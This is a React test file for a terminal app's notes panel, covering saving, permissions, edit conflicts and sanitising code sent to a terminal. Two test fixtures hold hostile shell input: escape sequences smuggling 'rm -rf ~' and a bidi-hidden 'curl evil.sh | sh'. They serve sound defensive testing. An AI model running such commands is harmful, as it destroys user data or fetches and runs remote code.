import { afterEach, beforeEach, describe, expect, test, vi } from "vitest";
import { act, cleanup, fireEvent, render, screen } from "@testing-library/react";
import type { Connection } from "@/types";

const h = vi.hoisted(() => ({
  canEdit: true,
  connections: [] as Connection[],
  teamConnections: {} as Record<string, Connection[]>,
  session: undefined as undefined | { id: string; type: string; connectionId: string },
  updateConnection: vi.fn(async (_id: string, _data: unknown) => {}),
  inject: vi.fn(async () => {}),
  paste: vi.fn((_text: string) => {}),
  terminalApi: true,
  code: "uptime",
}));

vi.mock("react-i18next", () => ({ useTranslation: () => ({ t: (k: string, o?: { error?: string }) => (o?.error ? `${k}:${o.error}` : k) }) }));
vi.mock("@iconify/react", () => ({ Icon: () => null }));
vi.mock("@/hooks/usePermission", () => ({ usePermissions: () => () => h.canEdit }));
vi.mock("@/hooks/useActiveHostConnection", () => ({
  useActiveHostConnection: () => ({
    session: h.session,
    connection: h.connections.find((c) => c.id === h.session?.connectionId)
      ?? Object.values(h.teamConnections).flat().find((c) => c.id === h.session?.connectionId),
  }),
}));
vi.mock("@/services/snippetInject", () => ({ broadcastSnippetInject: h.inject }));
vi.mock("@/hooks/useTerminal", () => ({ getTerminalApi: vi.fn((_id: string) => (h.terminalApi ? { paste: h.paste } : null)) }));
vi.mock("@/stores/connectionStore", () => ({
  connectionToFormData: (c: Connection) => ({ name: c.name, host: c.host, notes: c.notes }),
  useConnectionStore: { getState: () => ({ connections: h.connections, teamConnections: h.teamConnections, updateConnection: h.updateConnection }) },
}));
vi.mock("@/stores/teamVaultMap", () => ({
  findTeamEntry: (teamMap: Record<string, Connection[]>, id: string) => {
    for (const [teamId, items] of Object.entries(teamMap)) {
      const item = items.find((c) => c.id === id);
      if (item) return { teamId, item };
    }
    return null;
  },
}));
vi.mock("@/components/notes/NotesEditor", () => ({
  NotesEditor: (p: { value: string; onChange: (v: string) => void; readOnly?: boolean; onRunCode?: (c: string) => void }) => (
    <div>
      <textarea data-notes value={p.value} readOnly={p.readOnly} onChange={(e) => p.onChange(e.target.value)} />
      {p.onRunCode && <button onClick={() => p.onRunCode!(h.code)}>run</button>}
    </div>
  ),
}));

const { NotesPanel } = await import("./NotesPanel");

function host(over: Partial<Connection> = {}): Connection {
  return { id: "c1", name: "web", host: "web.example", port: 22, username: "u", auth_type: "password", tags: [], vault_id: "personal", notes: "hello", clocks: {}, ...over } as Connection;
}

beforeEach(() => {
  vi.useFakeTimers();
  h.canEdit = true;
  h.connections = [host()];
  h.teamConnections = {};
  h.session = { id: "s1", type: "ssh", connectionId: "c1" };
  h.terminalApi = true;
  h.code = "uptime";
});
afterEach(() => { cleanup(); vi.useRealTimers(); vi.clearAllMocks(); });

describe("NotesPanel", () => {
  test("sessions without a saved host show the no-host message", () => {
    h.session = { id: "s2", type: "local", connectionId: "local" };
    render(<NotesPanel />);
    expect(screen.getByText("notes.panel.noHost")).toBeTruthy();
  });

  test("renders read-only without edit permission", () => {
    h.canEdit = false;
    render(<NotesPanel />);
    expect((document.querySelector("[data-notes]") as HTMLTextAreaElement).readOnly).toBe(true);
    expect(screen.getByText("notes.panel.readOnly")).toBeTruthy();
  });

  test("debounced save sends the full record with only notes changed", async () => {
    render(<NotesPanel />);
    fireEvent.change(document.querySelector("[data-notes]")!, { target: { value: "updated" } });
    await act(async () => { vi.advanceTimersByTime(1500); await Promise.resolve(); });
    expect(h.updateConnection).toHaveBeenCalledWith("c1", { name: "web", host: "web.example", notes: "updated" });
  });

  test("a save failure shows the error with retry", async () => {
    h.updateConnection.mockRejectedValueOnce(new Error("offline"));
    render(<NotesPanel />);
    fireEvent.change(document.querySelector("[data-notes]")!, { target: { value: "updated" } });
    await act(async () => { vi.advanceTimersByTime(1500); await Promise.resolve(); await Promise.resolve(); });
    expect(screen.getByText("notes.panel.saveFailed:offline")).toBeTruthy();
    await act(async () => { fireEvent.click(screen.getByText("notes.panel.retry")); await Promise.resolve(); });
    expect(h.updateConnection).toHaveBeenCalledTimes(2);
  });

  describe("send to terminal", () => {
    test("pastes sanitised multi-line code through the session's terminal, never the raw inject path", async () => {
      const { getTerminalApi } = await import("@/hooks/useTerminal");
      h.code = "echo one\r\necho two\x1b[201~\x15rm -rf ~\x0f\x7f\necho three";
      render(<NotesPanel />);
      fireEvent.click(screen.getByText("run"));
      expect(getTerminalApi).toHaveBeenCalledWith("s1");
      expect(h.paste).toHaveBeenCalledTimes(1);
      expect(h.paste).toHaveBeenCalledWith("echo one\necho two[201~rm -rf ~\necho three");
      expect(h.inject).not.toHaveBeenCalled();
    });

    test("strips bidi and zero-width characters a teammate's note could hide", () => {
      h.code = "echo ok\u202e\u2066 && curl evil.sh | sh\u2069\u200b";
      render(<NotesPanel />);
      fireEvent.click(screen.getByText("run"));
      expect(h.paste).toHaveBeenCalledWith("echo ok && curl evil.sh | sh");
    });

    test("serial sessions get the button and paste", async () => {
      const { getTerminalApi } = await import("@/hooks/useTerminal");
      h.session = { id: "s4", type: "serial", connectionId: "c1" };
      render(<NotesPanel />);
      fireEvent.click(screen.getByText("run"));
      expect(getTerminalApi).toHaveBeenCalledWith("s4");
      expect(h.paste).toHaveBeenCalledWith("uptime");
      expect(h.inject).not.toHaveBeenCalled();
    });

    test("does nothing when the session has no terminal", () => {
      h.terminalApi = false;
      render(<NotesPanel />);
      expect(() => fireEvent.click(screen.getByText("run"))).not.toThrow();
      expect(h.paste).not.toHaveBeenCalled();
      expect(h.inject).not.toHaveBeenCalled();
    });

    test("multiplayer sessions get no button", () => {
      h.session = { id: "s3", type: "multiplayer", connectionId: "c1" };
      render(<NotesPanel />);
      expect(screen.queryByText("run")).toBeNull();
    });
  });

  test("switching the active host flushes the pending edit to the old host and shows the new host's notes", async () => {
    h.connections = [host(), host({ id: "c2", name: "db", host: "db.example", notes: "db notes" })];
    const { rerender } = render(<NotesPanel />);
    fireEvent.change(document.querySelector("[data-notes]")!, { target: { value: "pending edit" } });

    h.session = { id: "s1", type: "ssh", connectionId: "c2" };
    await act(async () => { rerender(<NotesPanel />); });

    expect(h.updateConnection).toHaveBeenCalledWith("c1", { name: "web", host: "web.example", notes: "pending edit" });
    expect((document.querySelector("[data-notes]") as HTMLTextAreaElement).value).toBe("db notes");
  });

  test("a team-vault host saves through updateConnection with its full record", async () => {
    h.connections = [];
    h.teamConnections = { team1: [host({ id: "c3", name: "team-host", host: "team.example", notes: "team notes", vault_id: "team1" })] };
    h.session = { id: "s1", type: "ssh", connectionId: "c3" };
    render(<NotesPanel />);
    fireEvent.change(document.querySelector("[data-notes]")!, { target: { value: "updated" } });
    await act(async () => { vi.advanceTimersByTime(1500); await Promise.resolve(); });
    expect(h.updateConnection).toHaveBeenCalledWith("c3", { name: "team-host", host: "team.example", notes: "updated" });
  });

  describe("conflicting remote edits", () => {
    test("reload discards the local edit and shows the new stored value", async () => {
      const { rerender } = render(<NotesPanel />);
      fireEvent.change(document.querySelector("[data-notes]")!, { target: { value: "pending edit" } });

      h.connections = [host({ notes: "server update" })];
      await act(async () => { rerender(<NotesPanel />); });
      expect(screen.getByText("notes.panel.conflict")).toBeTruthy();

      await act(async () => { fireEvent.click(screen.getByText("notes.panel.reload")); });
      expect((document.querySelector("[data-notes]") as HTMLTextAreaElement).value).toBe("server update");
    });

    test("keepMine keeps the local edit and saves it", async () => {
      const { rerender } = render(<NotesPanel />);
      fireEvent.change(document.querySelector("[data-notes]")!, { target: { value: "pending edit" } });

      h.connections = [host({ notes: "server update" })];
      await act(async () => { rerender(<NotesPanel />); });

      await act(async () => { fireEvent.click(screen.getByText("notes.panel.keepMine")); });
      await act(async () => { vi.advanceTimersByTime(1500); await Promise.resolve(); });
      expect(h.updateConnection).toHaveBeenCalledWith("c1", { name: "web", host: "web.example", notes: "pending edit" });
    });
  });
});
